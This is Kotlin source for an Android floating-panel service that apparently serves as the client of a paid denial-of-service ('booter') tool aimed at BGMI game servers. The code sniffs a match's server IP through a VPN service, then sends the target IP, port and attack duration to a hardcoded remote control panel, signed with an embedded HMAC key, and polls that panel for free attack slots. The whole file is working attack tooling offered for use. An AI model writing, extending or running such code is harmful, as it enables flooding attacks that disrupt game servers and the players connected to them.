package com.teamjadugar.apk

import android.animation.ObjectAnimator
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.media.AudioManager
import android.media.ToneGenerator
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.*
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

class FloatingService : Service() {

    private lateinit var windowManager: WindowManager
    private var floatingView: View? = null
    private var bubbleView: View? = null
    private var overlayView: View? = null

    private lateinit var paramsPanel: WindowManager.LayoutParams
    private lateinit var paramsBubble: WindowManager.LayoutParams
    private lateinit var paramsOverlay: WindowManager.LayoutParams

    private var etIp: EditText? = null
    private var etPort: EditText? = null
    private var tvTime: TextView? = null
    private var btnAttack: Button? = null
    private var btnGetIp: Button? = null
    private var tvLog: TextView? = null
    private var tvSlots: TextView? = null
    private var tvBubbleTimer: TextView? = null

    private var selectedTime = 120
    private var isAttacking = false
    private var pulseAnimator: ObjectAnimator? = null
    private var slotsJob: Job? = null
    private var overlayShown = false
    private var toneGenerator: ToneGenerator? = null

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null
        var etPortRef: EditText? = null
        var btnGetIpRef: Button? = null

        const val MAX_ATTACK_SECONDS = 300
        const val MIN_ATTACK_SECONDS = 30
        private const val PANEL_URL = "http://13.211.179.172:5000"
        private const val HMAC_KEY = "SPECTRE_SECURE_2026"

        fun onIpFound(ip: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(ip)
                etPortRef?.setText(port)
                btnGetIpRef?.text = "IP FOUND ✅"
                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
                Toast.makeText(instance, "BGMI IP Caught: $ip", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    private fun playSound(type: String) {
        try {
            if (toneGenerator == null) toneGenerator = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
            when (type) {
                "click" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_BEEP, 50)
                "success" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_ACK, 150)
                "error" -> toneGenerator?.startTone(ToneGenerator.TONE_PROP_NACK, 150)
            }
        } catch (e: Exception) {}
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("floating_channel", "Floating Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, "floating_channel")
            .setContentTitle("SPECTRE API").setContentText("Floating Panel is running")
            .setSmallIcon(android.R.drawable.ic_dialog_info).build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            } else {
                startForeground(1, notification)
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Notification Fail: ${e.message}", Toast.LENGTH_LONG).show()
            stopSelf(); return
        }

        try {
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE

            paramsPanel = WindowManager.LayoutParams(WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT, type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT)
            paramsPanel.gravity = Gravity.TOP or Gravity.START
            paramsPanel.x = 50; paramsPanel.y = 150
            
            paramsBubble = WindowManager.LayoutParams(WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT, type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT)
            paramsBubble.gravity = Gravity.TOP or Gravity.START
            paramsBubble.x = 50; paramsBubble.y = 150
            
            paramsOverlay = WindowManager.LayoutParams(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT, type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT)
            paramsOverlay.gravity = Gravity.CENTER

            floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
            bubbleView = LayoutInflater.from(this).inflate(R.layout.floating_bubble, null)
            overlayView = LayoutInflater.from(this).inflate(R.layout.layout_big_timer, null)

            floatingView?.let { windowManager.addView(it, paramsPanel) }

            etIp = floatingView?.findViewById(R.id.fEtIp)
            etPort = floatingView?.findViewById(R.id.fEtPort)
            tvTime = floatingView?.findViewById(R.id.fTvTime)
            tvLog = floatingView?.findViewById(R.id.tvLog)
            tvSlots = floatingView?.findViewById(R.id.tvSlots)
            btnAttack = floatingView?.findViewById(R.id.fBtnAttack)
            btnGetIp = floatingView?.findViewById(R.id.fBtnGetIp)
            tvBubbleTimer = bubbleView?.findViewById(R.id.tvBubbleTimer)

            val btnVpnOff = floatingView?.findViewById<Button>(R.id.fBtnVpnOff)
            val seekBar = floatingView?.findViewById<SeekBar>(R.id.fSeekBar)

            etIpRef = etIp; etPortRef = etPort; btnGetIpRef = btnGetIp

            startButtonPulse()
            startSlotsPolling()

            floatingView?.findViewById<TextView>(R.id.btnClose)?.setOnClickListener { playSound("click"); stopSelf() }
            
            floatingView?.findViewById<TextView>(R.id.btnMinimize)?.setOnClickListener {
                playSound("click")
                floatingView?.let { windowManager.removeView(it) }
                bubbleView?.let { windowManager.addView(it, paramsBubble) }
            }
            
            setupBubbleDrag()
            
            bubbleView?.setOnClickListener {
                playSound("click")
                bubbleView?.let { windowManager.removeView(it) }
                floatingView?.let { windowManager.addView(it, paramsPanel) }
            }

            seekBar?.max = MAX_ATTACK_SECONDS - MIN_ATTACK_SECONDS
            seekBar?.progress = 90
            selectedTime = MIN_ATTACK_SECONDS + (seekBar?.progress ?: 90)
            tvTime?.text = "ATTACK DURATION: ${selectedTime}s"

            seekBar?.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
                override fun onProgressChanged(sb: SeekBar?, progress: Int, fromUser: Boolean) {
                    selectedTime = (MIN_ATTACK_SECONDS + progress).coerceIn(MIN_ATTACK_SECONDS, MAX_ATTACK_SECONDS)
                    tvTime?.text = "ATTACK DURATION: ${selectedTime}s"
                }
                override fun onStartTrackingTouch(sb: SeekBar?) {}
                override fun onStopTrackingTouch(sb: SeekBar?) {}
            })

            btnGetIp?.setOnClickListener {
                playSound("click")
                tvLog?.text = "> SNIFFING BGMI..."
                btnGetIp?.text = "SNIFFING..."
                btnGetIp?.isEnabled = false
                try {
                    startService(Intent(this, VpnService::class.java))
                } catch (e: Exception) {
                    tvLog?.text = "> VPN ERROR: ${e.message}"
                    btnGetIp?.text = "GET IP"
                    btnGetIp?.isEnabled = true
                }
            }
            
            btnVpnOff?.setOnClickListener {
                playSound("click")
                try { stopService(Intent(this, VpnService::class.java)) } catch (_: Exception) {}
                tvLog?.text = "> VPN STOPPED"
                btnGetIp?.text = "GET IP"
                btnGetIp?.isEnabled = true
                btnGetIp?.setBackgroundColor(android.graphics.Color.parseColor("#1A102E"))
                btnGetIp?.setTextColor(android.graphics.Color.parseColor("#00E5FF"))
            }

            btnAttack?.setOnClickListener {
                if (isAttacking) {
                    playSound("error")
                    Toast.makeText(this, "Attack already running!", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                
                val ip = etIp?.text.toString().trim()
                val portInt = etPort?.text.toString().trim().toIntOrNull()
                
                if (ip.isEmpty() || portInt == null) {
                    playSound("error")
                    Toast.makeText(this, "IP or Valid Port missing!", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                
                playSound("click")
                isAttacking = true
                pulseAnimator?.cancel()
                btnAttack?.text = "LAUNCHING..."
                btnAttack?.isEnabled = false
                
                // Test ke liye Toast
                Toast.makeText(this, "Sending Request...", Toast.LENGTH_SHORT).show()
                executeAttack(ip, portInt, selectedTime)
            }
            setupPanelDragAndResize()
        } catch (e: Exception) {
            Toast.makeText(this, "GLOBAL CRASH: ${e.message}", Toast.LENGTH_LONG).show()
            stopSelf()
        }
    }

    private fun executeAttack(ip: String, port: Int, durationSec: Int) {
        serviceScope.launch {
            var ok = false
            var errMsg = "Unknown Error"
            
            try {
                val key = SessionStore.currentKey(this@FloatingService)
                if (key.isEmpty()) {
                    withContext(Dispatchers.Main) { 
                        resetAttackButton()
                        tvLog?.text = "> KEY EMPTY" 
                        playSound("error") 
                        Toast.makeText(this@FloatingService, "Key Missing!", Toast.LENGTH_SHORT).show()
                    }
                    return@launch
                }

                val url = URL("$PANEL_URL/connect/action")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                val bodyObj = JSONObject().apply {
                    put("key", key)
                    put("ip", ip)
                    put("port", port)
                    put("time", durationSec)
                }
                val body = bodyObj.toString()

                val mac = Mac.getInstance("HmacSHA256")
                mac.init(SecretKeySpec(HMAC_KEY.toByteArray(), "HmacSHA256"))
                val signature = mac.doFinal(body.toByteArray()).joinToString("") { String.format("%02x", it) }
                
                conn.setRequestProperty("X-App-Signature", signature)
                OutputStreamWriter(conn.outputStream).use { it.write(body) }

                val code = conn.responseCode
                val resp = (if (code in 200..299) conn.inputStream else conn.errorStream)?.bufferedReader()?.readText() ?: ""

                Log.d("ATTACK_DEBUG", "HTTP Code: $code | Response: $resp")

                withContext(Dispatchers.Main) {
                    if (code in 200..299) {
                        try {
                            val json = JSONObject(resp)
                            val valid = json.optBoolean("valid", false)
                            val attackOk = json.optBoolean("attack", true)
                            val msg = json.optString("msg", "")
                            
                            if (valid && attackOk) {
                                ok = true
                            } else {
                                errMsg = msg.ifEmpty { "Rejected by Panel" }
                            }
                        } catch (e: Exception) {
                            errMsg = "Invalid JSON: $resp"
                        }
                    } else {
                        errMsg = "HTTP $code : ${resp.take(30)}"
                    }
                }
            } catch (e: Exception) {
                errMsg = e.message ?: "Network Error"
                Log.e("ATTACK_DEBUG", "Exception: ${e.message}")
                
                // SCREEN PAR NETWORK ERROR TOAST
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@FloatingService, "Network Error: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }

            withContext(Dispatchers.Main) {
                if (ok) {
                    playSound("success")
                    btnAttack?.text = "LAUNCHED ✅"
                    btnAttack?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                    tvLog?.text = "> ATTACK STARTED"
                    runCountdown(durationSec)
                } else {
                    playSound("error")
                    resetAttackButton()
                    btnAttack?.text = "FAILED ❌"
                    btnAttack?.setBackgroundColor(android.graphics.Color.parseColor("#EF4444"))
                    tvLog?.text = "> FAIL: $errMsg"
                    Toast.makeText(this@FloatingService, "Fail: $errMsg", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    private fun resetAttackButton() {
        isAttacking = false
        btnAttack?.let {
            it.text = "🚀 LAUNCH ATTACK"
            it.isEnabled = true
            it.setBackgroundColor(android.graphics.Color.parseColor("#B026FF"))
            startButtonPulse()
        }
    }

    private fun startButtonPulse() {
        pulseAnimator?.cancel()
        btnAttack?.let { btn ->
            pulseAnimator = ObjectAnimator.ofFloat(btn, "alpha", 1f, 0.6f, 1f).apply {
                duration = 1000
                repeatCount = ObjectAnimator.INFINITE
                start()
            }
        }
    }

    private fun startSlotsPolling() {
        slotsJob?.cancel()
        slotsJob = serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL("$PANEL_URL/connect/slots")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.connectTimeout = 3000
                    conn.readTimeout = 3000
                    
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.setRequestProperty("Accept", "application/json")
                    
                    if (conn.responseCode == 200) {
                        val res = conn.inputStream.bufferedReader().readText()
                        val json = JSONObject(res)
                        val used = json.optInt("slots_used", 0)
                        val total = json.optInt("slots_total", 10)
                        withContext(Dispatchers.Main) {
                            tvSlots?.text = "SLOTS: $used/$total"
                            tvSlots?.setTextColor(if (used >= total) android.graphics.Color.RED else android.graphics.Color.parseColor("#00E5FF"))
                        }
                    }
                } catch (_: Exception) {}
                delay(5000)
            }
        }
    }

    private fun runCountdown(totalSec: Int) {
        serviceScope.launch(Dispatchers.Main) {
            var remaining = totalSec
            while (remaining > 0) {
                tvLog?.text = "⏱ ${remaining}s"
                tvLog?.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                tvBubbleTimer?.visibility = View.VISIBLE
                tvBubbleTimer?.text = "${remaining}s"
                if (remaining <= 3) showBigOverlay(remaining)
                delay(1000)
                remaining--
            }
            tvBubbleTimer?.visibility = View.GONE
            tvLog?.text = ""
            showFinishedOverlay()
            resetAttackButton()
        }
    }

    private fun showBigOverlay(num: Int) {
        if (!overlayShown) {
            try { overlayView?.let { windowManager.addView(it, paramsOverlay) }; overlayShown = true } catch (_: Exception) {}
        }
        val tvBig = overlayView?.findViewById<TextView>(R.id.tvBigTimer)
        val tvMsg = overlayView?.findViewById<TextView>(R.id.tvBigMsg)
        tvBig?.textSize = 200f
        tvBig?.text = "$num"
        tvMsg?.text = "GET READY"
        tvBig?.scaleX = 0.6f
        tvBig?.scaleY = 0.6f
        tvBig?.animate()?.scaleX(1.2f)?.scaleY(1.2f)?.setDuration(250)?.withEndAction {
            tvBig?.animate()?.scaleX(1f)?.scaleY(1f)?.setDuration(150)?.start()
        }?.start()
    }

    private fun showFinishedOverlay() {
        if (!overlayShown) {
            try { overlayView?.let { windowManager.addView(it, paramsOverlay) }; overlayShown = true } catch (_: Exception) {}
        }
        val tvBig = overlayView?.findViewById<TextView>(R.id.tvBigTimer)
        val tvMsg = overlayView?.findViewById<TextView>(R.id.tvBigMsg)
        tvBig?.textSize = 110f
        tvBig?.text = "✅"
        tvMsg?.text = "ATTACK FINISHED"
        Handler(Looper.getMainLooper()).postDelayed({ hideOverlay() }, 2000)
    }

    private fun hideOverlay() {
        if (overlayShown) {
            try { overlayView?.let { windowManager.removeView(it) } } catch (_: Exception) {}
            overlayShown = false
        }
    }

    private var initialX = 0
    private var initialY = 0
    private var initialTouchX = 0f
    private var initialTouchY = 0f

    private fun setupPanelDragAndResize() {
        val header = floatingView?.findViewById<LinearLayout>(R.id.headerLayout)
        header?.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialX = paramsPanel.x
                    initialY = paramsPanel.y
                    initialTouchX = event.rawX
                    initialTouchY = event.rawY
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    paramsPanel.x = initialX + (event.rawX - initialTouchX).toInt()
                    paramsPanel.y = initialY + (event.rawY - initialTouchY).toInt()
                    try { floatingView?.let { windowManager.updateViewLayout(it, paramsPanel) } } catch (_: Exception) {}
                    true
                }
                else -> false
            }
        }
    }

    private var bubbleInitialX = 0
    private var bubbleInitialY = 0
    private var bubbleInitialTouchX = 0f
    private var bubbleInitialTouchY = 0f
    private var isBubbleDragging = false

    private fun setupBubbleDrag() {
        bubbleView?.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    bubbleInitialX = paramsBubble.x
                    bubbleInitialY = paramsBubble.y
                    bubbleInitialTouchX = event.rawX
                    bubbleInitialTouchY = event.rawY
                    isBubbleDragging = false
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val dx = event.rawX - bubbleInitialTouchX
                    val dy = event.rawY - bubbleInitialTouchY
                    if (Math.abs(dx) > 10 || Math.abs(dy) > 10) {
                        isBubbleDragging = true
                        paramsBubble.x = bubbleInitialX + dx.toInt()
                        paramsBubble.y = bubbleInitialY + dy.toInt()
                        bubbleView?.let { windowManager.updateViewLayout(it, paramsBubble) }
                    }
                    true
                }
                MotionEvent.ACTION_UP -> {
                    if (!isBubbleDragging) bubbleView?.performClick()
                    true
                }
                else -> false
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        hideOverlay()
        try { floatingView?.let { windowManager.removeView(it) } } catch (_: Exception) {}
        try { bubbleView?.let { windowManager.removeView(it) } } catch (_: Exception) {}
        toneGenerator?.release()
        instance = null
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
